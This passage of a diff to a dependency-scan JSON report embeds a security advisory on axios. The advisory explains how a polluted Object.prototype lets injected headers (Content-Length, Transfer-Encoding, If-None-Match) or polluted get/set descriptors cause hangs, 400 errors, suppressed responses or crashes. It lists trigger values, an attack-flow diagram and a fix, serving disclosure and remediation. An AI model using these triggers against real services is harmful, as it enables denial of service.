(lib\/core\/mergeConfig.js:26:10)\n```\n\n## Impact\n\n- **Server hang** (`Content-Length: 99999`): receiver waits for a body that never arrives. Affects requests with a body.\n- **CL+TE conflict** (`Transfer-Encoding: chunked` rides alongside axios's auto `Content-Length`): receiver rejects with `400 Bad Request`. Affects requests with a body.\n- **Response suppression** (`If-None-Match: *`): receiver returns empty `304 Not Modified`. Affects GET \/ HEAD.\n- **Crash DoS** (`Object.prototype.get` \/ `.set`): every axios request fails synchronously with `TypeError`, not `AxiosError`, so handlers filtering on `error.isAxiosError` mishandle the failure.\n\n## Attack Flow\n\n```mermaid\nflowchart TD\n    ROOT[\"Polluted Object.prototype<br\/>via upstream gadget (e.g. lodash &lt;= 4.17.10 _.merge \/ CVE-2018-16487)<br\/>axios &lt;= 1.15.2\"]\n\n    ROOT --> CLASS_A[\"A. Arbitrary HTTP Header Injection<br\/>Polluted defaults.headers slot rides along on every outbound axios request\"]\n    ROOT --> CLASS_B[\"B. Crash DoS via Object.prototype.get \/ .set<br\/>Polluted descriptor breaks Object.defineProperty in mergeConfig\"]\n\n    CLASS_A --> PRE_A[\"Precondition: header not set per-request by the app<br\/>Injected via defaults.headers slot<br\/>(common, delete, head, post, put, patch, query)\"]\n\n    PRE_A --> PA1[\"Response Suppression<br\/>Trigger: common = {If-None-Match: *}<br\/>Affects GET \/ HEAD\"]\n    PA1 --> SA1[\"DoS<br\/>304 Not Modified empty\"]\n\n    PRE_A --> PA2[\"Server Hang<br\/>Trigger: common = {Content-Length: 99999}<br\/>Affects requests with body\"]\n    PA2 --> SA2[\"DoS<br\/>connection hang\"]\n\n    PRE_A --> PA3[\"CL+TE Conflict<br\/>Trigger: common = {Transfer-Encoding: chunked}<br\/>Affects requests with body\"]\n    PA3 --> SA3[\"DoS<br\/>400 Bad Request\"]\n\n    CLASS_B --> SB1[\"DoS<br\/>TypeError: Getter \/ Setter must be a function<br\/>Crashes every axios request, not only GET\"]\n\n    %% Styles\n    style ROOT fill:#f87171,stroke:#991b1b,color:#fff\n    style CLASS_A fill:#fb923c,stroke:#9a3412,color:#fff\n    style CLASS_B fill:#fb923c,stroke:#9a3412,color:#fff\n    style PRE_A fill:#e2e8f0,stroke:#64748b,color:#1e293b\n    style PA1 fill:#fbbf24,stroke:#92400e,color:#000\n    style PA2 fill:#fbbf24,stroke:#92400e,color:#000\n    style PA3 fill:#fbbf24,stroke:#92400e,color:#000\n    style SA1 fill:#ef4444,stroke:#991b1b,color:#fff\n    style SA2 fill:#ef4444,stroke:#991b1b,color:#fff\n    style SA3 fill:#ef4444,stroke:#991b1b,color:#fff\n    style SB1 fill:#ef4444,stroke:#991b1b,color:#fff\n```\n\n## Root Cause\n\n**Finding A.** `lib\/utils.js:404-429`'s `merge()` creates `result = {}` at line 406. The dangerous-keys filter on lines 408-411 blocks the write side, but the read at line 414 (`isPlainObject(result[targetKey])`) still walks the prototype chain. When `targetKey` matches a polluted slot, `result[targetKey]` returns the polluted nested object, and the recursive `merge(result[targetKey], val)` on line 415 iterates that object's own keys via `forEach` and copies them as own properties into the new accumulator. Those keys flow through `mergeConfig.js:35` \u2192 `Axios.js:148` (`utils.merge(headers.common, headers[config.method])`) \u2192 `Axios.js:155` (`AxiosHeaders.concat(...)`) \u2192 onto the wire via `http.js:677` (`headers: headers.toJSON()`) \u2192 `http.js:767` (`transport.request(options, ...)`).\n\n**Finding B.** `lib\/core\/mergeConfig.js:25` correctly makes `config = Object.create(null)`, but the descriptor passed on line 26 is a plain-object literal - its `get`\/`set` lookups walk `Object.prototype`. A polluted non-function `Object.prototype.get` or `.set` makes `Object.defineProperty` throw `TypeError: Getter must be a function` (or `Setter must be a function`) before the call returns. The descriptor is built unconditionally on every `mergeConfig` invocation, so every axios request throws - POST, PUT, DELETE, PATCH, HEAD, QUERY, not only GET.\n\n## Suggested Fix\n\nUse null-prototype objects in place of the plain-object literals at `lib\/utils.js:406` and `lib\/core\/mergeConfig.js:26-31`. The same descriptor pattern recurs at `lib\/core\/AxiosError.js:37`, `lib\/core\/AxiosHeaders.js:100`, `lib\/utils.js:447\/454\/492\/498`, and `lib\/adapters\/adapters.js:28\/32`.\n\n## Resources\n\n- [CVE-2018-16487](https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2018-16487) - `lodash.merge` prototype pollution in `lodash <= 4.17.10`\n- [CWE-1321](https:\/\/cwe.mitre.org\/data\/definitions\/1321.html) - Improperly Controlled Modification of Object Prototype Attributes",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2018-16487","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2018-16487"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-898c-q2cr-xwhg","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-898c-q2cr-xwhg"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-898c-q2cr-xwhg","name": "https:\/\/github.com\/advisories\/GHSA-898c-q2cr-xwhg"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:axios:\\<\\=0.31.1:*:*:*:*:*:*:*"
                         }
                     }                ]
                 }, {
@@ -140170,6 +140362,8 @@
                 "notes": "",
                 "references": [
  {
+                        "source": "0b142b55-0307-4c5a-b3c9-f314f3fb7c5e"
+,"url": "https:\/\/cert-portal.siemens.com\/productcert\/html\/ssa-253495.html"                    }, {
                         "source": "ce714d77-add3-4f53-aff5-83d477b104bb"
 ,"url": "https:\/\/github.com\/lodash\/lodash\/security\/advisories\/GHSA-xxjr-mmjv-4gpg","name": "VENDOR_ADVISORY"                    }, {
                         "source": "info"
@@ -141076,6 +141270,8 @@
                 "notes": "",
                 "references": [
  {
+                        "source": "0b142b55-0307-4c5a-b3c9-f314f3fb7c5e"
+,"url": "https:\/\/cert-portal.siemens.com\/productcert\/html\/ssa-253495.html"                    }, {
                         "source": "ce714d77-add3-4f53-aff5-83d477b104bb"
 ,"url": "https:\/\/github.com\/lodash\/lodash\/security\/advisories\/GHSA-xxjr-mmjv-4gpg","name": "VENDOR_ADVISORY"                    }, {
                         "source": "info"
@@ -143940,6 +144136,8 @@
                 "notes": "",
                 "references": [
  {
+                        "source": "0b142b55-0307-4c5a-b3c9-f314f3fb7c5e"
+,"url": "https:\/\/cert-portal.siemens.com\/productcert\/html\/ssa-253495.html"                    }, {
                         "source": "ce714d77-add3-4f53-aff5-83d477b104bb"
 ,"url": "https:\/\/github.com\/lodash\/lodash\/security\/advisories\/GHSA-xxjr-mmjv-4gpg","name": "VENDOR_ADVISORY"                    }                ],
                 "vulnerableSoftware": [
@@ -160132,9 +160330,9 @@
             "isVirtual": false,
             "fileName": "openconceptlab-3.1.0-SNAPSHOT-javadoc.jar",
             "filePath": "\/github\/workspace\/omod\/target\/openconceptlab-3.1.0-SNAPSHOT-javadoc.jar"
-,"md5": "d6f9b7cb6a6d4f74782e40f23338d78e",
-            "sha1": "7d50f0ab2b235e5462d1b9f714faac24ab1b688d",
-            "sha256": "e161d366448aa642663bc6667fb2754e0d1e2ec352ed64e950c6d3c99676642c"            ,"evidenceCollected": {
+,"md5": "639dd8657c6c6a1b9c48f07f98d812c2",
+            "sha1": "8e5b1c7041f16d2a6b00b058f6f4c8171683a113",
+            "sha256": "d5a52ca004205933c3c001818195cf16bbb66deda2c56d0e78a5fbdc7f07ed69"            ,"evidenceCollected": {
                 "vendorEvidence": [
 {
                             "type": "vendor",
@@ -160261,9 +160459,9 @@
             "isVirtual": false,
             "fileName": "openconceptlab-3.1.0-SNAPSHOT.jar",
             "filePath": "\/github\/workspace\/omod\/target\/openconceptlab-3.1.0-SNAPSHOT.jar"
-,"md5": "60354d616b6c2212625d8fde9efa9276",
-            "sha1": "fc696ef7f43b2ee57bfb227f59d01a8d3c934dfa",
-            "sha256": "de0fccbc37923781a9ddad0544742c4c278c142cd1cd524138caadc3ffe8fa19"            ,"evidenceCollected": {
+,"md5": "346be98266bcaebf273df9dc9a5a6290",
+            "sha1": "152f23adafb6eeaa7a7ec3c4ae6f1c4076b1b7b8",
+            "sha256": "3c3be317951b43bef41464f330b6af7aa3e9d1ca1191a38bae0c9c28fb41ff42"            ,"evidenceCollected": {
                 "vendorEvidence": [
 {
                             "type": "vendor",
@@ -160367,9 +160565,9 @@
             "isVirtual": false,
             "fileName": "openconceptlab-api-3.1.0-SNAPSHOT-javadoc.jar",
             "filePath": "\/github\/workspace\/api\/target\/openconceptlab-api-3.1.0-SNAPSHOT-javadoc.jar"
-,"md5": "53f5a3bd74d8eabd5512d7263ca05eba",
-            "sha1": "73dc4286410c3002e6e9fb1de02b96d89f86131c",
-            "sha256": "1214da535b2474dcf8aee5f01ebcf0b65c9845ef8468d66c6b70bb98803be908"            ,"evidenceCollected": {
+,"md5": "be1a4d5a92b9b084956582b688e24e94",
+            "sha1": "528941a13d257627b33c821fbb721a4baadfb845",
+            "sha256": "e5552bc1317aa3b7098fba88cacce241208717ccf60db8d60b726afa5097b3f5"            ,"evidenceCollected": {
                 "vendorEvidence": [
 {
                             "type": "vendor",
@@ -160451,16 +160649,16 @@
             "isVirtual": false,
             "fileName": "openconceptlab-api-3.1.0-SNAPSHOT.jar",
             "filePath": "\/github\/workspace\/api\/target\/openconceptlab-api-3.1.0-SNAPSHOT.jar"
-,"md5": "a88ac05638c8925f1665b86aa4f6e2a0",
-            "sha1": "e0c7544ae7506f6d8d7b2dd8156b291917ee6810",
-            "sha256": "b86af5c38c9a241aebdf9d8808dbaa1371b2d6208e32c7a2f4eacc4ff644d3e9","description": "API project for OpenConceptLab"            ,"relatedDependencies": [
+,"md5": "e687e72480be32af319ca4a01162e16d",
+            "sha1": "fa325cf6b530a9c9fbaa2cb9a0b4c8462a2edff8",
+            "sha256": "d5c9b05e6d82ebbe900f0e48d7cf07e75b56b44584f26551e373e4ee1919894f","description": "API project for OpenConceptLab"            ,"relatedDependencies": [
   {
                     "isVirtual": false,
                     "fileName": "openconceptlab-api-3.1.0-SNAPSHOT.jar",
                     "filePath": "\/github\/workspace\/omod\/target\/openconceptlab-3.1.0-SNAPSHOT\/lib\/openconceptlab-api-3.1.0-SNAPSHOT.jar"
-,"sha256": "b86af5c38c9a241aebdf9d8808dbaa1371b2d6208e32c7a2f4eacc4ff644d3e9",
-                    "sha1": "e0c7544ae7506f6d8d7b2dd8156b291917ee6810",
-                    "md5": "a88ac05638c8925f1665b86aa4f6e2a0"
+,"sha256": "d5c9b05e6d82ebbe900f0e48d7cf07e75b56b44584f26551e373e4ee1919894f",
+                    "sha1": "fa325cf6b530a9c9fbaa2cb9a0b4c8462a2edff8",
+                    "md5": "e687e72480be32af319ca4a01162e16d"
                 }
             ]
             ,"evidenceCollected": {
